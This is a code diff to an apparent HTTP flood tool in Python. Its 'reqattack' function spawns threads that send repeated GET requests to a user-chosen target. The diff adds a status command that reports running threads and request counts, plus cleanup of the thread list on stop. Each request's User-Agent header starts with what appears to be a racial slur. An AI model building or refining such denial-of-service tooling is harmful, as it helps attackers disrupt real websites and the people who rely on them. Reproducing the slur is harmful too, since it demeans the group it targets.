@@ -79,19 +79,19 @@ def reqattack(target, stop_event):
     while not stop_event.is_set():
         if settings.userset_useragent:
             header = {
-                "user-agent": "Higgers " + settings.useragent
+                "User-Agent": "Higgers " + settings.useragent
             }
         elif settings.uarand == "words":
             header = {
-                "user-agent": "Higgers " + random.choice(settings.wordlist)
+                "User-Agent": "Higgers " + random.choice(settings.wordlist)
             }
         elif settings.uarand == "num":
             header = {
-                "user-agent": "Higgers " + str(random.randrange(11111, 99999))
+                "User-Agent": "Higgers " + str(random.randrange(11111, 99999))
             }
         else:
             header = {
-                "user-agent": "Higgers " + random.choice(settings.wordlist)
+                "User-Agent": "Higgers " + random.choice(settings.wordlist)
             }
         requests.get(target, headers=header)
         settings.reqmade += 1
@@ -199,6 +199,12 @@ while True:
         else:
             settings.target = target
             print("Set Target to " + target)
+    
+    elif cmd == "status":
+        if settings.running:
+            print("Attack *RUNNING*")
+            print("Open threads: " + str(len(settings.threads)) + " (target " + str(settings.targetthreads) + ")")
+            print("Requests made so far: " + str(settings.reqmade))
 
     elif cmd == "start":
         check_success = True
@@ -256,12 +262,14 @@ while True:
             print("!!!! Started attack !!!!")
     elif cmd == "stop":
         if settings.running:
-            print("=! STATUS REPORT != Stopping attack... (wait a long time...)")
+            print("=! STATUS REPORT != Stopping attack...")
             print("Setting stop flag...")
             stop_event.set()
-            print("Joining threads...")
+            print("Joining threads... (wait a long time...)")
             for thread in settings.threads:
                 thread.join()
+            print("Clearing thread list...")
+            settings.threads = []
             print("Stopped attack!")
             settings.running = False
         else:
